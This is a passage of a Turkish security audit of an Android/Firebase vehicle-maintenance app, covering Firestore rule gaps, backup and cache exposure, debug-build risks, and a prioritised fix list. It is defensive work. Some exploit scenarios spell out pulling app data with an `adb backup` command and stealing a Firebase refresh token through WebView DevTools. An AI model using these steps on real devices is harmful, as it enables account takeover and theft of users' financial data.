- **`adb backup`:** USB hata ayıklaması açık, kilidi açılmış bir cihaza fiziksel erişimi
  olan biri `adb backup -f out.ab com.bakim.takip.mobile` ile veri dizinini çeker,
  IndexedDB dosyalarını okur → tüm finansal veri + oturum token'ı.
  *Doğruluk notu:* `adb backup` Android 12+ sürümlerde büyük ölçüde kısıtlanmıştır ve
  `targetSdk 36` ile bu yol modern cihazlarda çoğunlukla kapalıdır. Yani asıl kalıcı
  risk, birinci maddedeki **buluta yedekleme**dir. Bu bulguyu "adb ile herkes çeker"
  diye abartmıyorum.

**Nasıl düzeltilir**

Finansal + kimlik verisi tutan bir uygulama için en temiz çözüm yedeklemeyi kapatmak:

```xml
<application
    android:allowBackup="false"
    android:dataExtractionRules="@xml/data_extraction_rules"
    …>
```

Yedekleme özelliğini korumak isterseniz `allowBackup="true"` bırakıp
`res/xml/data_extraction_rules.xml` içinde Firestore IndexedDB ve Auth dizinlerini
`<exclude>` ile hariç tutun. Uygulamanın kendi "Yedek Al" özelliği (`app.js:566-569`)
zaten kullanıcıya açık bir yedekleme yolu sunduğu için `allowBackup="false"` işlevsellik
kaybı yaratmaz.

---

## O-3 — Firestore kalıcı önbelleği çıkışta temizlenmiyor (ortak cihaz senaryosu)

**Önem derecesi:** Orta
**Nerede:** `www/firebase-adapter.js:29` ve `www/app.js:54`, `:160`

**Sorun ne**

`doLogout()` (`app.js:160`) `signOut(auth)` çağırıyor; `onAuthStateChanged` tetikleniyor ve
`app.js:54` uygulama state'ini temizliyor (`state.vehicles=[]; state.selId=null;`) —
**bu kısım doğru yapılmış.** Ancak `persistentLocalCache()` ile açılan **Firestore disk
önbelleği signOut ile temizlenmez**; IndexedDB'de kalır.

**Nasıl istismar edilir (somut senaryo)**

Aile içinde paylaşılan bir tablet: A kullanıcısı çıkış yapar, B kullanıcısı giriş yapar.

- **Uygulama üzerinden B, A'nın verisini göremez.** Doğruladım: tüm sorgular
  `where('ownerId','==',uid())` içerdiği için (`firebase-adapter.js:103` vb.) B'nin
  sorguları A'nın dokümanlarıyla eşleşmez. Burada bir sızıntı **yok** — bunu abartmıyorum.
- **Ancak veri fiziksel olarak diskte, şifresiz duruyor.** Root'lu bir cihazda, cihaz
  onarıma verildiğinde, ya da **O-2** ile birleştiğinde (buluta yedekleme) A'nın verisi
  A'nın kontrolünden çıkmış olur. Kullanıcı "çıkış yaptım" dediğinde makul olarak
  verisinin cihazda kalmadığını varsayar.

**Nasıl düzeltilir**

`logout` fonksiyonunu önbelleği de temizleyecek şekilde genişletin
(`firebase-adapter.js:335`):

```js
import { terminate, clearIndexedDbPersistence } from ".../firebase-firestore.js";

async logout(){
  await signOut(auth);
  try {
    await terminate(db);                 // aktif dinleyicileri kapat
    await clearIndexedDbPersistence(db); // disk önbelleğini sil
  } catch(e) { /* açık sekme varsa failed-precondition döner, yut */ }
  location.reload();                     // yeni bir Firestore örneği ile başla
}
```

`clearIndexedDbPersistence` yalnızca Firestore örneği sonlandırıldıktan sonra çalışır ve
sonrasında o `db` örneği kullanılamaz — bu yüzden `location.reload()` gerekli. Bu aynı
zamanda **D-3**'teki bayat `warningCount` sorununu da temizler.

---

## O-4 — Araç silme sunucu tarafında cascade değil; "sildim" denen veri kalabiliyor

**Önem derecesi:** Orta
**Nerede:** `www/firebase-adapter.js:125-130`

```js
async delete(id){
  await deleteAllDocs(query(collection(db,'vehicles',id,'expenses'), where('ownerId','==',uid())));
  await deleteAllDocs(query(collection(db,'vehicles',id,'parts'),    where('ownerId','==',uid())));
  await deleteDoc(doc(db,'vehicles',id));
  return {success:true};
}
```

**Sorun ne**

Firestore'da bir dokümanı silmek **alt koleksiyonlarını silmez.** Burada temizlik tamamen
istemciye bırakılmış ve üç ayrı `await` ile, tek bir atomik işlem olmadan yapılıyor.

Üç ayrı yolla veri kalıcı olarak arkada kalır:

1. **İşlem yarıda kesilirse.** Kullanıcı `app.js:538-543`'teki "Sil" onayından sonra
   uygulamayı kapatırsa ya da internet koparsa: `expenses` silinmiş, `parts` silinmemiş,
   üst araç dokümanı hâlâ duruyor (ya da tam tersi sıralarda) → tutarsız durum.
2. **Üst doküman önce silinirse alt koleksiyon erişilemez hale gelir.** Üçüncü `await`
   çalışıp ilk ikisi başarısız olursa, altta kalan masraf ve parça dokümanları
   uygulamanın hiçbir ekranından listelenemez (araç listede yok) ama Firestore'da
   **finansal verilerle birlikte durmaya devam eder** ve hiçbir zaman silinemez.
3. **Y-3 ile birleşince garantili çöp:** `ownerId`'si değiştirilmiş bir masraf dokümanı
   `where('ownerId','==',uid())` filtresine takılmaz → `deleteAllDocs` onu atlar → sonra
   üst araç silinir → kalıcı yetim doküman.

Ayrıca ilgili bir tutarlılık hatası: `maintenance.deleteLog` (`firebase-adapter.js:185-189`)
bir bakım kaydını silerken `meta.bakim.partChangeIds` ile bağlı **parça dokümanlarını
silmiyor ve `isActive:false` yapmıyor.** Sonuç: dashboard, artık var olmayan bir bakım
kaydına dayanarak parçayı "takılı" göstermeye devam eder. Bu bir güvenlik açığı değil ama
uygulamanın **asıl işlevini** (doğru bakım uyarısı) bozar — Y-4'teki Cloud Function
çalışmasıyla birlikte ele alınmalı.

**Nasıl düzeltilir**

1. **Kısa vade:** Silme sırasını tersine çevirin — üst araç dokümanını **en son** silin
   (mevcut kod bunu zaten yapıyor, koruyun) ve tüm işlemi tek bir `try/catch` içine alıp
   hata durumunda kullanıcıya "silme tamamlanamadı, tekrar deneyin" gösterin. Şu an
   `app.js:538-543`'teki `delVehicle` **hiç `try/catch` içermiyor** — hata sessizce
   yutulan bir promise rejection olur ve kullanıcı silindiğini sanır.
2. **Doğru çözüm:** Y-4'te kurulacak Cloud Function'a bir de araç-silme tetikleyicisi
   ekleyin (`onDocumentDeleted('vehicles/{vehicleId}')`) ve alt koleksiyonları Admin SDK
   ile sunucu tarafında temizleyin. Firebase'in resmî
   [Delete User Data](https://extensions.dev/extensions/firebase/delete-user-data)
   uzantısı da bu işi hazır yapar ve Y-4 ile aynı Blaze gereksinimini paylaşır.

---

## O-5 — Debug APK ile dağıtım: WebView hata ayıklaması açık, imzasız, küçültme yok

**Önem derecesi:** Orta (üretime çıkış öncesi **engelleyici**)
**Nerede:** `android/app/build.gradle:19-24`

```gradle
buildTypes {
    release {
        minifyEnabled false
        proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'
    }
}
```

**Sorun ne** — üç ayrı madde:

1. **Debug build'de WebView hata ayıklaması açıktır.** Capacitor, `BuildConfig.DEBUG`
   true olduğunda `WebView.setWebContentsDebuggingEnabled(true)` çağırır. Bu, USB hata
   ayıklaması açık bir cihazda `chrome://inspect` üzerinden **çalışan uygulamanın
   WebView'ine tam DevTools erişimi** demektir: konsoldan `window.api` çağırmak,
   IndexedDB'den Firebase refresh token'ını okumak, `state` nesnesini görmek — hepsi
   mümkün. Görevde sorulan "konsoldan `navigate('vehicles')` çağırma" senaryosu tam
   olarak burada, ve **yalnızca burada**, gerçekleşebilir (release WebView'de konsol yok).
   *(Bunun veri sızdırmadığını ayrıca doğruladım — bkz. **§6 Route koruması**.)*
2. **`release` bloğunda `signingConfig` yok.** `assembleRelease` **imzasız** APK üretir;
   Play'e yüklenemez. Şu an dağıtılan şeyin debug keystore ile imzalı bir debug APK
   olması bunun sonucudur. Debug keystore tüm makinelerde aynı ve paroları herkesçe
   bilinen (`android`/`androiddebugkey`) bir anahtardır — bu anahtarla imzalı bir APK'nın
   kimliği doğrulanamaz.
3. **`minifyEnabled false`.** R8 küçültme/karıştırma kapalı. Bu uygulama için etkisi
   sınırlı (asıl mantık JS asset'lerinde; ProGuard onlara zaten dokunmaz) ama Java
   tarafını da açık bırakır ve APK'yı gereksiz büyütür.

**Nasıl istismar edilir (somut senaryo)**

Kullanıcının telefonuna kurulu debug APK + USB hata ayıklaması açık + kilidi açık cihaza
birkaç dakikalık fiziksel erişim → `chrome://inspect` → WebView konsolu →
`indexedDB` üzerinden `firebaseLocalStorageDb` okunur → refresh token alınır → saldırgan
kendi makinesinden, süresiz olarak, kullanıcının hesabına erişir. Şifre değiştirmek bu
token'ı hemen geçersiz kılmaz.

**Nasıl düzeltilir — üretime çıkmadan önce net olarak neyin değişmesi gerekiyor:**

```gradle
buildTypes {
    release {
        minifyEnabled true
        shrinkResources true
        debuggable false                    // varsayılan zaten false, açıkça yazın
        signingConfig signingConfigs.release
        proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
    }
}
```

- **Release keystore oluşturun ve depoya KOYMAYIN.** Parolalar `local.properties`
  (gitignore'lu) veya CI secret'ından okunmalı. Play App Signing kullanın.
- **`AndroidManifest.xml`'e `android:allowBackup="false"` ekleyin** (bkz. **O-2**).
- **App Check enforcement'ı açın** (bkz. **Y-2**) — ama önce monitoring modunda çalıştırın.
- **`versionCode`/`versionName` yönetimini kurun** — şu an `build.gradle:10-11`'de sabit
  `1` / `"1.0"`; ilk güncellemede Play yüklemeyi reddeder.
- **Kullanıcılara dağıtılan mevcut debug APK'yı yayından kaldırın**; release APK ile
  değiştirin (farklı imza nedeniyle kullanıcıların uygulamayı kaldırıp yeniden kurması
  gerekecek — bunu şimdi yapmak, kullanıcı sayısı arttıktan sonra yapmaktan iyidir).

---

## O-6 — Yedek alma: sahte başarı mesajı + şifresiz düz metin finansal yedek

**Önem derecesi:** Orta
**Nerede:** `www/firebase-adapter.js:294-311` ve `www/app.js:566-569`

**Sorun ne — iki ayrı problem:**

**(a) Başarı mesajı gerçeği yansıtmıyor olabilir.**
`firebase-adapter.js:310` **koşulsuz** `{success:true, filePath:filename}` döndürüyor.
`app.js:566-569` bunu görüp "Yedek kaydedildi: …" yazıyor. Ama indirme mekanizması
`a.download` + `a.click()` (`firebase-adapter.js:306-308`) — **Android WebView'de blob
indirmeleri, `DownloadListener` kaydedilmediği sürece sessizce hiçbir şey yapmaz.**
`capacitor.plugins.json` boş (`[]`) — yani `@capacitor/filesystem` gibi bir eklenti kurulu
değil ve Capacitor varsayılan olarak böyle bir listener kaydetmez.

> **Doğrulanamadı:** Bunu APK'yı cihazda çalıştırmadan kesinleştiremem. **Gerçek bir
> Android cihazda "Yedek Al"a basıp Downloads klasörünü kontrol edin.** Eğer dosya
> oluşmuyorsa, kullanıcı yıllarca "yedeğim var" sanıp aslında hiç yedeği olmayacak —
> uygulamanın verdiği en zararlı güvence türü budur.

**(b) Yedek, şifresiz düz metin JSON.** Çalıştığı senaryoda dosya; tüm araçlar,
kilometreler, her masrafın tutarı, tarihi ve notları ile `ownerId` (kullanıcının Firebase
uid'si) içerir (`firebase-adapter.js:295-302` — `vehicles` dizisi ham doküman verisini
taşır, `parts` da öyle). Dosya Downloads klasörüne düşer; `READ_MEDIA_*` izni olan
herhangi bir uygulama okuyabilir, kullanıcı farkında olmadan bulut senkronizasyonuna
girebilir.

**Nasıl düzeltilir**

1. **Önce (a)'yı doğrulayın.** Eğer indirme çalışmıyorsa `@capacitor/filesystem` eklentisi
   kurun ve `Filesystem.writeFile({ directory: Directory.Documents, … })` kullanın;
   `success` değerini **gerçek yazma sonucundan** üretin, sabit `true` döndürmeyin.
2. **`app.js:566-569`'a hata yönetimi ekleyin.** Şu an `exportBackup` `try/catch`
   içermiyor; `r.success` false ise kullanıcıya hiçbir şey söylenmiyor.
3. **Yedekten `ownerId` alanını çıkarın** — geri yüklemede zaten oturumdaki uid
   kullanılacak, dosyada taşınmasına gerek yok.
4. **Kullanıcıyı uyarın:** "Bu dosya tüm harcama kayıtlarınızı şifresiz içerir." Uzun
   vadede parola korumalı bir yedek (Web Crypto ile AES-GCM) değerlendirilebilir.
5. **Geri yükleme uygulanırken (`firebase-adapter.js:312-318`) Y-1'i mutlaka önce
   düzeltin** — aksi halde yedek dosyası, XSS payload'ı taşıyan bir saldırı vektörüne
   dönüşür.

---

# DÜŞÜK ÖNEM BULGULAR

## D-1 — Şifre politikası yalnızca istemci tarafında

**Önem:** Düşük | **Nerede:** `www/app.js:131`

```js
if(pass.length<8){errEl.textContent='Şifre en az 8 karakter olmalı.';…return;}
```

**Sorun:** Bu kontrol sadece kullanıcı deneyimidir. Firebase Authentication'ın varsayılan
sunucu tarafı kuralı **6 karakter**tir (`auth/weak-password` bunun altında tetiklenir —
`app.js:69`'da bu koda "en az 8 karakter" mesajı map'lenmiş, ki bu da yanıltıcı).
Yapılandırılabilir parola politikası **Identity Platform'a yükseltme** gerektirir.

**İstismar:** Y-2'deki REST API yolu ile 6 karakterlik bir şifreyle hesap açılır; istemci
kontrolü hiç devreye girmez. Etki sınırlıdır (kullanıcı kendi hesabını zayıflatmış olur),
bu yüzden Düşük.

**Düzeltme:** `security-notes.md:56-57`'nin işaret ettiği karar noktası:
Identity Platform'a geçilecek mi? Geçilmeyecekse bu, **yazıya dökülmüş kabul edilmiş bir
risk** olmalı. Ayrıca `app.js:69`'daki mesajı gerçeğe uydurun ("Şifre çok zayıf.").
NIST çizgisinde uzunluğu teşvik edin, karakter sınıfı dayatmayın (`security-notes.md:58-64`).

---

## D-2 — Kayıt ekranındaki `auth/email-already-in-use` mesajı bir enumeration oracle'ı

**Önem:** Düşük | **Nerede:** `www/app.js:68`

```js
'auth/email-already-in-use':'Bu e-posta ile zaten bir hesap var.',
```

**Sorun:** Giriş ve şifre sıfırlama akışlarında enumeration koruması **doğru** yapılmış
(`app.js:66-67`, `:154-157`). Ama kayıt akışı, "bu e-posta sistemde kayıtlı mı?"
sorusuna doğrudan cevap veren bir mesaj gösteriyor. Bir saldırgan kayıt formunu (ya da
Y-2'deki REST yolunu) e-posta listesi doğrulamak için kullanabilir.

**Doğrulanamadı:** Bu mesajın gerçekten görünüp görünmediği, Firebase Console →
Authentication → Settings altındaki **"Email enumeration protection"** ayarına bağlıdır.
Ayar **açıksa** Firebase bu hata kodunu döndürmez ve mesaj hiç tetiklenmez. **Konsoldan
kontrol edin.** Kod tabanından tespit edilemez.

**Düzeltme:** Konsol ayarını açık tutun (`security-notes.md:41-47`). Ayrıca `app.js:68`'i
savunmacı hale getirin: kayıt sonucunu her durumda jenerik gösterin ("Kayıt işlemi
alındı, e-postanızı kontrol edin") — böylece ayar ileride yanlışlıkla kapatılsa bile UI
sızdırmaz.

**İlgili UX hatası (aynı satırlar):** `doRegister` (`app.js:134-137`) başarıdan sonra
"Kayıt başarılı! Doğrulama e-postası gönderildi." mesajını gösteriyor. Ancak
`createUserWithEmailAndPassword` kullanıcıyı **otomatik olarak oturum açtırır** →
`onAuthStateChanged` (`app.js:53`) tetiklenir → `navigate('dashboard')` tüm `#app`
içeriğini değiştirir → **mesaj görünmeden kaybolur.** Kullanıcı doğrulama maili
gönderildiğini hiç öğrenmez. Y-2'deki "e-postanı doğrula" ekranı eklenirken bu akış da
düzeltilmeli.

---

## D-3 — `warningCount` çıkışta sıfırlanmıyor: önceki kullanıcının uyarı sayısı görünüyor

**Önem:** Düşük | **Nerede:** `www/app.js:12` (tanım), `:259` (yazım), `:54` (çıkış), `:178` (okuma)

**Sorun:** `warningCount` modül seviyesinde global bir değişken. Çıkışta
(`app.js:54`) `state.vehicles` ve `state.selId` temizleniyor — **ama `warningCount`
temizlenmiyor.** Aynı şey `editingLogId`, `editingExpenseId`, `editingVehicleId`
(`app.js:284-285`, `:478`) için de geçerli.

**İstismar (somut senaryo — görevde sorulan "önceki kullanıcının cache'lenmiş state'i"):**
Ortak bir tablette A kullanıcısının 7 uyarısı var. A çıkış yapar, B giriş yapar.
`init` → `navigate('dashboard')` → `renderLayout` (`app.js:178`) sidebar rozetini
`warningCount` = **7** ile çizer. Ardından `renderDashboard` → `renderWarningsSummary`
(`app.js:255-261`) B'nin gerçek sayısını hesaplayıp rozeti günceller.

Yani B, kısa bir süre için **A'nın uyarı sayısını** görür. Sızan şey tek bir tam sayıdır —
araç adı, tutar veya not sızmaz. Bu yüzden Düşük. Ama sinyal doğru: çıkışta uygulama
durumu **eksik** temizleniyor.

**Düzeltme:** `app.js:54`'ü tamamlayın:

```js
if(!user){
  state={vehicles:[],selId:null,view:'dashboard'};
  warningCount=0;
  editingLogId=null; editingExpenseId=null; editingVehicleId=null;
  renderLogin(); return;
}
```

O-3'teki `location.reload()` çözümü bu sorunu zaten kökten ortadan kaldırır — ikisini
birlikte uygulamak en temizi.

---

## D-4 — `users/{uid}` güncellemesinde alan validasyonu yok

**Önem:** Düşük | **Nerede:** `firestore.rules:10-11`

```js
allow read, update: if isSignedIn() && request.auth.uid == userId;
allow create:       if isSignedIn() && request.auth.uid == userId;
```

**Sorun:** Kullanıcı kendi `users/{uid}` dokümanına **istediği alanı, istediği değerle**
yazabilir. `firebase-adapter.js:330-332` normalde `{uid, email, displayName, createdAt}`
yazıyor, ama kural bunu zorlamıyor:

```js
await updateDoc(doc(db,'users',BENIM_UID), { email:'admin@sirket.com', role:'admin' });
```

**Etki neden Düşük:** Şu an **hiçbir kural `users/*` dokümanını yetkilendirme için
okumuyor** — yani `role:'admin'` yazmak hiçbir kapı açmaz. Gerçek risk **güvenilen verinin
kayması**: `users/{uid}.email` alanı Auth'taki gerçek e-postadan farklı olabilir. İleride
bir Cloud Function, admin paneli veya destek ekranı bu alana güvenirse (ör. "kullanıcıya
mail at"), zehirlenmiş veriyi kullanır.

**Düzeltme:**

```js
match /users/{userId} {
  allow read: if isSignedIn() && request.auth.uid == userId;

  allow create: if isSignedIn() && request.auth.uid == userId
    && request.resource.data.keys().hasOnly(['uid','email','displayName','createdAt'])
    && request.resource.data.uid == userId
    && request.resource.data.email == request.auth.token.email
    && request.resource.data.displayName is string
    && request.resource.data.displayName.size() <= 80;

  allow update: if isSignedIn() && request.auth.uid == userId
    && request.resource.data.diff(resource.data).affectedKeys().hasOnly(['displayName'])
    && request.resource.data.displayName is string
    && request.resource.data.displayName.size() <= 80;

  allow delete: if false;
}
```

`displayName` uzunluk sınırı ayrıca Y-1 ile ilişkilidir: `displayName` bugün hiçbir yerde
render **edilmiyor** (`app.js:556` yalnızca `user.email` gösteriyor), ama ileride bir
"Merhaba, {ad}" başlığı eklenirse doğrudan bir XSS sink'i olur.

---

## D-5 — Kullanılmayan `FileProvider` fazla geniş yapılandırılmış; `config.xml` artığı

**Önem:** Düşük | **Nerede:** `android/app/src/main/res/xml/file_paths.xml`,
`android/app/src/main/res/xml/config.xml`, `AndroidManifest.xml:27-35`

**Sorun (a) — `file_paths.xml`:**

```xml
<external-path name="my_images" path="." />
<cache-path     name="my_cache_images" path="." />
```

`path="."` = **harici depolamanın tamamı**. Yani bu FileProvider authority'si, teoride
harici depolamadaki herhangi bir dosya için `content://` URI üretebilir. Provider
`exported="false"` (`AndroidManifest.xml:30`) olduğu için **başka bir uygulama kendi
başına bu URI'leri isteyemez** — yalnızca bu uygulama açıkça bir grant verirse erişim
oluşur. Ve `capacitor.plugins.json` **boş** (`[]`) → hiçbir eklenti kurulu değil → bu
provider'ı kullanan **hiçbir kod yok**. Yani şu an **etkisiz**. Yine de saldırı yüzeyi
olarak durmasının bir gerekçesi yok.

**Sorun (b) — `config.xml`:**

```xml
<widget …><access origin="*" /></widget>
```

Bu bir **Cordova** yapılandırmasıdır ve Capacitor bunu **okumaz**; Capacitor'ın kendi
navigasyon izinleri `capacitor.config.json` içindeki `server.allowNavigation` ile
yönetilir (orada böyle bir alan yok, yani varsayılan sıkı davranış geçerli). Dolayısıyla
`origin="*"` **bir açık değildir** — kod tabanında öyle görünüyor olsa da.
Bunu bir bulgu olarak abartmıyorum; sadece yanlış alarma yol açmaması için kayda geçiriyorum.

**Düzeltme:** Herhangi bir eklenti (kamera, dosya sistemi) eklenene kadar
`AndroidManifest.xml:27-35`'teki `<provider>` bloğunu ve `file_paths.xml`'i kaldırın.
İleride gerekirse `path="."` yerine dar bir alt dizin (`path="bakim-takip/"`) tanımlayın.
`config.xml` Capacitor'ın cordova köprüsü için üretilen bir artıktır; dokunmayın ama
güvenlik değerlendirmelerinde dikkate almayın.

---

# BİLGİ / DOĞRULANAMADI

Bunlar bulgu değil; **kod tabanından tespit edilemeyen, konsoldan doğrulanması gereken**
maddelerdir. Emin olmadığım için Kritik/Yüksek diye işaretlemiyorum.

## B-1 — `firestore.rules` gerçekten deploy edildi mi?

`firebase.json` kuralları doğru işaret ediyor (`"rules": "firestore.rules"`) ve
`.firebaserc` projeyi `arac-masraf-takip-app` olarak tanımlıyor. Ama depodaki bir dosyanın
varlığı, **canlı projede yürürlükte olduğu anlamına gelmez**. Eğer Firestore hâlâ "test
mode" ile açıldıysa (`allow read, write: if request.time < timestamp.date(…)`), o zaman
bu raporun tüm kural analizi geçersizdir ve **gerçekten Kritik bir açık vardır: herkes
her şeyi okur/yazar.**

**Yapılacak:** Firebase Console → Firestore Database → Rules sekmesinde yürürlükteki
metnin `firestore.rules` ile birebir aynı olduğunu **gözle doğrulayın**. Ardından
`firebase deploy --only firestore:rules` komutunu CI'a bağlayın ki bir daha ayrışmasın.
Ayrıca Console'daki **Rules Playground** ile Y-3 ve O-1'deki senaryoları test edin.

## B-2 — API key kısıtlamaları ve Auth konsol ayarları

Kod tabanından okunamayan, Google Cloud / Firebase Console'dan kontrol edilmesi gerekenler:

- **API key kısıtlaması:** GCP Console → APIs & Services → Credentials →
  `AIzaSyDqhx98…` anahtarına **Android app restriction** (paket adı
  `com.bakim.takip.mobile` + release keystore SHA-1) ve **API restriction**
  (yalnızca Identity Toolkit + Firestore + Token Service) uygulanmış mı?
  *Not: Bu kısıtlama App Check'in yerini tutmaz — SHA-1 kısıtlaması REST API çağrılarını
  engellemez, sadece belirli Google API'lerinde geçerlidir. Yine de yapılmalı.*
- **Email enumeration protection** açık mı? (bkz. **D-2**)
- **Authorized domains** listesinde yalnızca gerekli alanlar var mı?
- **Firebase Auth kota/abuse ayarları** ve mevcut plan (Spark mı Blaze mi) — Y-2 ve Y-4
  bu kararı bekliyor.

## B-3 — COLLECTION_GROUP indeksleri var ama kurallar recursive wildcard kullanmıyor

`firestore.indexes.json` içinde `expenses` ve `parts` için `COLLECTION_GROUP` kapsamlı
indeksler tanımlı. Ancak `firestore.rules` bu koleksiyonları **yol-kapsamlı** eşleştiriyor
(`match /vehicles/{vehicleId}/expenses/{expenseId}`). Firestore'da bir
**collection group sorgusu yalnızca recursive wildcard'lı bir kuralla**
(`match /{path=**}/expenses/{expenseId}`) yetkilendirilir. Yani şu an bir istemci
`collectionGroup('expenses')` sorgusu atarsa **reddedilir** — bu indeksler pratikte sadece
Admin SDK / Cloud Functions içindir (kurallar zaten bypass edilir). Tutarlı bir tasarım.

**Riskin nerede olduğu:** Bir gün biri istemciye "tüm araçlardaki masrafları tek sorguda
getir" özelliği ekleyip `permission-denied` alacak ve refleks olarak şunu yazacak:

```js
match /{path=**}/expenses/{expenseId} {
  allow read: if isSignedIn();     // ← TEHLİKELİ: tüm kullanıcıların masrafları okunur
}
```

Bu, raporda "yok" dediğim kullanıcılar arası okuma açığını **tek satırda yaratır.**
Şimdiden `firestore.rules`'a bir yorum düşün: *"Collection group sorgusu gerekirse
recursive wildcard kuralı `resource.data.ownerId == request.auth.uid` şartıyla yazılmalı
ve sorguya `where('ownerId','==',uid())` filtresi eklenmelidir."*
Not: `listAllWarnings` (`firebase-adapter.js:252-291`) şu an araç başına ayrı sorgu atarak
bu ihtiyacı doğru şekilde (ama N+1 sorguyla) karşılıyor.

---

# Özel olarak sorulan konuların cevapları

## §6 — Oturum ve route koruması gerçekten çalışıyor mu?

**Soru:** `init()`/`onAuthStateChanged` gate'i her ekranı koruyor mu? Konsoldan
`navigate('vehicles')` çağrılarak auth'suz veri görülebilir mi?

**Cevap: Hayır, veri görülemez. UI gate'i incedir ama altındaki iki katman tutuyor.**
Zinciri ucundan ucuna takip ettim:

```
navigate('vehicles')            app.js:184
  → renderLayout(view)          app.js:169  → state.vehicles boş (çıkışta app.js:54 temizliyor) → araç seçici hiç render edilmiyor
  → renderVehicles(el)          app.js:480
    → loadVehicles()            app.js:162
      → window.api.vehicles.list()    firebase-adapter.js:101
        → uid()                       firebase-adapter.js:37-41
          → auth.currentUser yok → throw new Error('Oturum açık değil')   ← 1. bariyer
```

Ve bu bariyer aşılsa bile ikinci bariyer var: Firestore Security Rules
(`firestore.rules:33` — `resource.data.ownerId == request.auth.uid`) sunucu tarafında
reddeder. `request.auth` null olduğu için hiçbir okuma geçmez.

**Fark edilen küçük kusurlar (bulgu seviyesine çıkmayan):**

- `renderVehicles` (`app.js:480-492`), kardeşlerinin aksine (`renderDashboard:201`,
  `renderHistory:413`, `renderExpenses:431`) **`try/catch` içermiyor.** Yukarıdaki hata
  yakalanmamış bir promise rejection'a dönüşür ve kullanıcı **boş bir ekran** görür,
  hata mesajı görmez. Veri sızmaz ama davranış tutarsız. Aynı şey `delVehicle`
  (`app.js:538`), `delLog` (`app.js:422`), `delExpense` (`app.js:473`) ve
  `editExpense` (`app.js:465`) için de geçerli.
- Sızan tek şey **D-3**'teki bayat `warningCount` sayısıdır.
- **Release build'de konsol zaten yoktur** — bu senaryo yalnızca debug APK'da
  gerçekleşebilir (bkz. **O-5**).

## §4 — API key'in APK'da olması neden (genelde) sorun değil, ne zaman sorun?

**Sorun değil, çünkü:** Firebase web/mobil API key'i bir *sır* değil, bir *proje
tanımlayıcısı*dır. Yetki vermez; hangi projeye konuşulduğunu söyler. Google bunu resmen
belgeler. `firebase-config.js:2-4`'teki yorum bu konuda **doğru** ve yorumu değiştirmeye
gerek yok.

**Sorun olduğu koşullar — ve bu projede üçü de geçerli:**

| Koşul | Bu projede | Bulgu |
|---|---|---|
| Security Rules zayıf/eksik validasyon | ✗ Alan/tip/boyut validasyonu yok | **Y-2** |
| App Check yok | ✗ Hiç kurulmamış | **Y-2** |
| Kayıt açık + doğrulama zorlanmıyor | ✗ Sınırsız, doğrulamasız hesap | **Y-2** |
| Kurallar deploy edilmemiş olabilir | ? Doğrulanmadı | **B-1** |

Yani key'in kendisi risk değil; **key + App Check yokluğu + zayıf yazma validasyonu**
birlikte risktir. `firebase-config.js`'i gizlemeye, obfuscate etmeye veya sunucudan
çekmeye çalışmak **zaman kaybıdır** — doğru yatırım App Check ve kural validasyonudur.

---

# ÖNCE ŞUNU DÜZELT — önceliklendirilmiş liste

Sıralama; **etki × istismar kolaylığı × düzeltme maliyeti** üçlüsüne göre yapıldı.
1-4 arası maddeler "yayına çıkmadan önce" değil, **şimdi** yapılmalı.

### Hemen (bu hafta)

| # | Bulgu | Neden önce bu | Tahmini efor |
|---|---|---|---|
| **1** | **B-1** — Yürürlükteki Firestore kurallarını konsoldan doğrula | Bu raporun tüm kural analizi bu varsayıma dayanıyor. Kurallar deploy edilmemişse elimizde **Kritik** bir açık var ve sıralama tamamen değişir. 5 dakikalık iş. | 5 dk |
| **2** | **Y-3** — `expenses` update kuralına `ownerId`/`vehicleId` değişmezliği ekle | Tek dosyada 2 satır. İstemci kodunu bozmuyor (doğrulandı). Kardeş kurallarda zaten var — sadece unutulmuş. En yüksek kazanç/maliyet oranı. | 15 dk |
| **3** | **O-1** — `parts` create kuralına korumalı alan yasağını ekle | Yine tek dosyada 2 satır. Mevcut istemci bu alanları yazmıyor, yani **hiçbir şeyi bozmaz**. Bildirim altyapısı gelmeden kapatılmalı. | 15 dk |
| **4** | **Y-1** — `esc()` yardımcısı + tüm interpolasyonları sar | Mekanik ama geniş bir iş (~20 nokta). Yedekten geri yükleme özelliği yazılmadan **önce** bitmiş olmalı; sonra yazılırsa Kritik'e döner. Ayrıca `<` içeren notların ekranı bozması hatasını da çözer. | 2-3 saat |

### Yayına çıkmadan önce (engelleyici)

| # | Bulgu | Neden |
|---|---|---|
| **5** | **Y-2a** — App Check (Play Integrity), önce monitoring sonra enforcement | Kota tükenmesi/DoS'a karşı tek gerçek koruma. Monitoring aşaması zaman aldığı için erken başlatın. |
| **6** | **Y-2b** — Kurallarda `email_verified` + `create` alan validasyonu; UI'da doğrulama ekranı | `security-notes.md:32-36`'nın açık gereksinimi. Token yenileme akışını (`reload()`+`getIdToken(true)`) atlamayın. |
| **7** | **Y-4** — Hesap silme akışı + cascade Cloud Function + gizlilik/KVKK metinleri | Play/App Store **yayın engeli**. Blaze plan kararını da beraberinde getirir; erken karar verin. |
| **8** | **O-5** — Release build: signingConfig, `minifyEnabled true`, imzalı APK; debug APK'yı geri çekin | Debug APK'da WebView DevTools açık → fiziksel erişimle token çalınabilir. |
| **9** | **O-2** — `android:allowBackup="false"` (veya `dataExtractionRules`) | Tek satır. Auth refresh token'ının buluta yedeklenmesini durdurur. |

### Sonraki tur (fonksiyonel doğruluk ve hijyen)

| # | Bulgu |
|---|---|
| **10** | **O-6** — "Yedek Al"ın cihazda gerçekten dosya yazıp yazmadığını **doğrulayın**; sabit `success:true` yerine gerçek sonucu döndürün |
| **11** | **O-4** — Araç/bakım silmede sunucu tarafı cascade (Y-4'teki function ile birlikte); `delVehicle`'a `try/catch` |
| **12** | **O-3** — Çıkışta `clearIndexedDbPersistence` + `location.reload()` |
| **13** | **D-3** — Çıkışta `warningCount` ve `editing*` global'lerini sıfırla (12 ile birlikte çözülür) |
| **14** | **D-4** — `users/{uid}` kurallarına alan validasyonu |
| **15** | **D-1**, **D-2** — Şifre politikası kararını yazıya dök; kayıt hata mesajını jenerikleştir; **B-2**'deki konsol ayarlarını kontrol et |
| **16** | **D-5** — Kullanılmayan `FileProvider`'ı kaldır |
| **17** | **B-3** — `firestore.rules`'a collection-group uyarı yorumu ekle |

### Kapsam dışı ama fark edildi (güvenlik değil, doğruluk)

- `maintenance.deleteLog` (`firebase-adapter.js:185-189`) bakım kaydını silerken bağlı
  parça dokümanlarını silmiyor/pasifleştirmiyor → dashboard silinmiş bir bakıma dayanarak
